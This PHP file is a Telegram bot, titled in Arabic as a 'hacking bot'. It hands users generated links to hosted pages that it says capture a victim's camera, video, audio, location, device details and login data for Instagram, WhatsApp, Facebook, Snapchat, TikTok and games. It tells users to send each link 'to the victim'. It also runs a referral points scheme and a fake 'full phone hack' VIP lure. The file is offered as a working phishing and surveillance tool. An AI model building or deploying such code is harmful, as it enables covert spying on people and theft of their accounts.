<?php
// ==============================================
// بوت الاختراق المتكامل - النسخة المصححة
// ==============================================

// ========== الإعدادات الأساسية ==========
$token = "توكن";
$admin_id = "ايدي";
$required_channel = ""; // قناة الاشتراك الإجباري بدون @
$base_url = "رابط استضافة";

define('API_KEY', $token);
define('BASE_URL', $base_url);

// ========== إنشاء المجلدات ==========
if (!file_exists('database')) mkdir('database', 0777, true);
if (!file_exists('database/captured')) mkdir('database/captured', 0777, true);
if (!file_exists('database/audio')) mkdir('database/audio', 0777, true);
if (!file_exists('database/videos')) mkdir('database/videos', 0777, true);

// ========== ملف النقاط ==========
$points_file = "database/points.json";
$users_points = file_exists($points_file) ? json_decode(file_get_contents($points_file), true) : [];

// ========== الروابط ==========
$cam_links = [
    'cam1' => BASE_URL . "/cam1.php?cam=front_cam&id={user_id}",
    'cam2' => BASE_URL . "/cam2.php?cam=back_cam&id={user_id}",
    'cam3' => BASE_URL . "/cam3.php?cam=link_mine&id={user_id}&url=https://www.google.com",
    'cam4' => BASE_URL . "/cam4.php?cam=record_video&id={user_id}",
    'cam5' => BASE_URL . "/cam5.php?cam=location&id={user_id}",
    'cam6' => BASE_URL . "/cam6.php?cam=instagram&id={user_id}",
    'cam7' => BASE_URL . "/cam7.php?cam=whatsapp&id={user_id}",
    'cam8' => BASE_URL . "/cam8.php?cam=pubg&id={user_id}",
    'cam9' => BASE_URL . "/cam9.php?cam=facebook&id={user_id}",
    'cam10' => BASE_URL . "/cam10.php?cam=snapchat&id={user_id}",
    'cam11' => BASE_URL . "/cam11.php?cam=freefire&id={user_id}",
    'cam12' => BASE_URL . "/cam12.php?cam=tiktok&id={user_id}",
    'cam13' => BASE_URL . "/cam13.php?cam=device_info&id={user_id}",
    'cam14' => BASE_URL . "/cam14.php?cam=youtube&id={user_id}",
    'cam15' => BASE_URL . "/cam15.php?cam=record_audio&id={user_id}",
];

$button_names = [
    'cam1' => 'كاميرا أمامية 📸',
    'cam2' => 'كاميرا خلفية 📷',
    'cam3' => 'تلغيم رابط 💣',
    'cam4' => 'تصوير فيديو 🎥',
    'cam5' => 'اختراق الموقع 📍',
    'cam6' => 'انستغرام 📺',
    'cam7' => 'واتساب 📗',
    'cam8' => 'ببجي 🎮',
    'cam9' => 'فيسبوك 🔮',
    'cam10' => 'سناب شات 🌟',
    'cam11' => 'فري فاير 👾',
    'cam12' => 'تيك توك 🎵',
    'cam13' => 'معلومات الجهاز 🔬',
    'cam14' => 'يوتيوب 🪼',
    'cam15' => 'تسجيل الصوت 🎙️',
];

// ========== دالة إرسال الطلبات ==========
function bot($method, $datas = []) {
    $url = "https://api.telegram.org/bot" . API_KEY . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res);
}

// ========== دالة إرسال رسالة ==========
function sendMessage($chat_id, $text, $keyboard = null) {
    $datas = ['chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML'];
    if ($keyboard) {
        $datas['reply_markup'] = json_encode($keyboard);
    }
    return bot('sendMessage', $datas);
}

// ========== دالة الحصول على النقاط ==========
function getUserPoints($user_id) {
    global $users_points;
    return isset($users_points[$user_id]) ? $users_points[$user_id] : 0;
}

function addUserPoints($user_id, $points) {
    global $users_points, $points_file;
    $users_points[$user_id] = ($users_points[$user_id] ?? 0) + $points;
    file_put_contents($points_file, json_encode($users_points));
}

// ========== دالة التحقق من الاشتراك ==========
function isSubscribed($user_id, $channel) {
    $url = "https://api.telegram.org/bot" . API_KEY . "/getChatMember?chat_id=@$channel&user_id=$user_id";
    $result = @json_decode(file_get_contents($url), true);
    if (isset($result['result']['status'])) {
        $status = $result['result']['status'];
        return in_array($status, ['member', 'creator', 'administrator']);
    }
    return false;
}

// ========== تسجيل المستخدمين الجدد ==========
function logNewUser($user_id, $first_name, $username) {
    global $admin_id;
    $file = "database/users.txt";
    $users = file_exists($file) ? file($file, FILE_IGNORE_NEW_LINES) : [];
    if (!in_array($user_id, $users)) {
        file_put_contents($file, $user_id . "\n", FILE_APPEND);
        $text = "🔔 مستخدم جديد انضم للبوت!\n👤 الاسم: $first_name\n🆔 المعرف: @$username\n💳 الايدي: <code>$user_id</code>";
        sendMessage($admin_id, $text);
    }
}

// ========== لوحة المفاتيح الرئيسية ==========
function getMainKeyboard() {
    return [
        'inline_keyboard' => [
            [['text' => 'كاميرا أمامية 📸', 'callback_data' => 'cam1'], ['text' => 'كاميرا خلفية 📷', 'callback_data' => 'cam2']],
            [['text' => 'تلغيم رابط 💣', 'callback_data' => 'cam3'], ['text' => 'تصوير فيديو 🎥', 'callback_data' => 'cam4']],
            [['text' => 'اختراق الموقع 📍', 'callback_data' => 'cam5'], ['text' => 'معلومات الجهاز 🔬', 'callback_data' => 'cam13']],
            [['text' => 'انستغرام 📺', 'callback_data' => 'cam6'], ['text' => 'واتساب 📗', 'callback_data' => 'cam7']],
            [['text' => 'ببجي 🎮', 'callback_data' => 'cam8'], ['text' => 'فيسبوك 🔮', 'callback_data' => 'cam9']],
            [['text' => 'سناب شات 🌟', 'callback_data' => 'cam10'], ['text' => 'فري فاير 👾', 'callback_data' => 'cam11']],
            [['text' => 'تيك توك 🎵', 'callback_data' => 'cam12'], ['text' => 'يوتيوب 🪼', 'callback_data' => 'cam14']],
            [['text' => 'تسجيل الصوت 🎙️', 'callback_data' => 'cam15']],
            [['text' => '💰 نقاطي', 'callback_data' => 'show_points']],
            [['text' => '🔞 اختراق الهاتف كاملاً', 'callback_data' => 'full_hack']],
            [['text' => '👨‍🎓 المطور', 'url' => 'https://t.me/llUUU9']]
        ]
    ];
}

// ========== معالجة الدخول ==========
$update = json_decode(file_get_contents('php://input'), true);
if (!$update) exit;

// استخراج البيانات
$message = $update['message'] ?? null;
$callback = $update['callback_query'] ?? null;

if ($message) {
    $chat_id = $message['chat']['id'];
    $user_id = $message['from']['id'];
    $first_name = $message['from']['first_name'] ?? 'Unknown';
    $username = $message['from']['username'] ?? '';
    $text = $message['text'] ?? '';
    
    // تسجيل المستخدم
    logNewUser($user_id, $first_name, $username);
    
    // التحقق من الاشتراك الإجباري
    if (!isSubscribed($user_id, $required_channel)) {
        $keyboard = [
            'inline_keyboard' => [
                [['text' => '📢 اشترك في القناة', 'url' => "https://t.me/$required_channel"]],
                [['text' => '🔄 تحقق من الاشتراك', 'callback_data' => 'check_sub']]
            ]
        ];
        sendMessage($chat_id, "❌ عذراً، يجب الاشتراك في القناة أولاً:\n👉 @$required_channel\n\nبعد الاشتراك اضغط على زر التحقق.", $keyboard);
        exit;
    }
    
    // معالجة الأوامر
    if ($text == '/start') {
        sendMessage($chat_id, "مرحباً بك! كل الأزرار مجانية، اختر ما تريد:", getMainKeyboard());
    }
    
    // أمر /free لمعرفة النقاط
    if ($text == '/free') {
        $points = getUserPoints($user_id);
        sendMessage($chat_id, "💰 نقاطك الحالية: $points\n\nكل شخص يدخل عن طريق رابطك يمنحك نقطة واحدة.");
    }
    
    // أمر /Vip الوهمي
    if ($text == '/Vip') {
        $points = getUserPoints($user_id);
        $bot_username = "lrq_01_bot"; // غير إلى يوزر بوتك
        $invite_link = "https://t.me/$bot_username?start=$user_id";
        
        $msg = "🔓 تم فتح أوامر اختراق الهاتف كاملاً!\n\n"
             . "🔗 رابط تجميع النقاط الخاص بك:\n"
             . "<code>$invite_link</code>\n\n"
             . "📊 عند دخول شخص عبر الرابط سوف تحصل على 1 نقطة.\n\n"
             . "💎 استخدم الأمر /free لمعرفة نقاطك.\n\n"
             . "⚠️ هذا الرابط دائم ولا ينتهي حتى بعد إعادة تشغيل البوت.";
        
        sendMessage($chat_id, $msg);
        
        // إرسال تنبيه للأدمن
        sendMessage($admin_id, "⚠️ المستخدم [$first_name](tg://user?id=$user_id) استخدم أمر /Vip (اختراق الهاتف الكامل - ).");
    }
    
    // معالجة الدعوات
    if (preg_match('/^\/start (.+)/', $text, $matches)) {
        $ref_id = $matches[1];
        if ($ref_id != $user_id && is_numeric($ref_id)) {
            addUserPoints($ref_id, 1);
            sendMessage($ref_id, "🎉 مبروك! حصلت على نقطة إضافية لأن شخصاً جديداً انضم عن طريق رابطك!");
        }
    }
}

// ========== معالجة الأزرار ==========
if ($callback) {
    $chat_id = $callback['message']['chat']['id'];
    $user_id = $callback['from']['id'];
    $first_name = $callback['from']['first_name'] ?? 'Unknown';
    $data = $callback['data'];
    $message_id = $callback['message']['message_id'];
    
    // التحقق من الاشتراك
    if (!isSubscribed($user_id, $required_channel) && $data != 'check_sub') {
        $keyboard = [
            'inline_keyboard' => [
                [['text' => '📢 اشترك في القناة', 'url' => "https://t.me/$required_channel"]],
                [['text' => '🔄 تحقق من الاشتراك', 'callback_data' => 'check_sub']]
            ]
        ];
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "❌ يجب الاشتراك في القناة أولاً: @$required_channel",
            'reply_markup' => json_encode($keyboard)
        ]);
        exit;
    }
    
    // زر التحقق من الاشتراك
    if ($data == 'check_sub') {
        if (isSubscribed($user_id, $required_channel)) {
            bot('editMessageText', [
                'chat_id' => $chat_id,
                'message_id' => $message_id,
                'text' => "✅ تم التحقق! اشتراكك مؤكد.\nأرسل /start للمتابعة."
            ]);
        } else {
            bot('answerCallbackQuery', [
                'callback_query_id' => $callback['id'],
                'text' => "❌ لم يتم العثور على اشتراكك",
                'show_alert' => true
            ]);
        }
        exit;
    }
    
    // أزرار الكاميرات والاختراقات
    if (substr($data, 0, 3) == 'cam') {
        $link = str_replace('{user_id}', $user_id, $cam_links[$data]);
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "✅ تم إنشاء الرابط الخاص بـ {$button_names[$data]}:\n\n<code>$link</code>\n\nأرسله للضحية وسيتم إرسال البيانات إليك فوراً.",
            'parse_mode' => 'HTML'
        ]);
    }
    
    // زر عرض النقاط
    if ($data == 'show_points') {
        $points = getUserPoints($user_id);
        $bot_username = "lrq_01_bot"; // غير إلى يوزر بوتك
        $invite_link = "https://t.me/$bot_username?start=$user_id";
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "💰 نقاطك الحالية: <code>$points</code>\n\n🎁 رابط الدعوة الخاص بك:\n<code>$invite_link</code>\n\n✨ كل شخص يدخل عن طريق رابطك يمنحك نقطة واحدة!\n\n💎 استخدم الأمر /free لمعرفة نقاطك.",
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode([
                'inline_keyboard' => [
                    [['text' => '🔗 مشاركة الرابط', 'switch_inline_query' => $invite_link]]
                ]
            ])
        ]);
    }
    
    // زر اختراق الهاتف كاملاً (وهمي - يوجه المستخدم لأمر /Vip)
    if ($data == 'full_hack') {
        $points = getUserPoints($user_id);
        $bot_username = "lrq_01_bot"; // غير إلى يوزر بوتك
        $invite_link = "https://t.me/$bot_username?start=$user_id";
        
        $msg = "🔓 قم بفتح أوامر اختراق الهاتف كاملاً قم بضغط على هذا الأمر /Vip\n\n"
             . "🔗 رابط تجميع النقاط الخاص بك:\n"
             . "<code>$invite_link</code>\n\n"
             . "📊 عند دخول شخص عبر الرابط سوف تحصل على 1 نقطة.\n\n"
             . "💎 استخدم الأمر /free لمعرفة نقاطك.\n\n"
             . "⚠️ هذا الرابط دائم ولا ينتهي حتى بعد إعادة تشغيل البوت.";
        
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => $msg,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode([
                'inline_keyboard' => [
                    [['text' => '🔗 مشاركة الرابط', 'switch_inline_query' => $invite_link]]
                ]
            ])
        ]);
        
        // إرسال تنبيه للأدمن
        sendMessage($admin_id, "⚠️ المستخدم [$first_name](tg://user?id=$user_id) ضغط على زر اختراق الهاتف الكامل (تم).");
    }
}

echo 'ok';
?>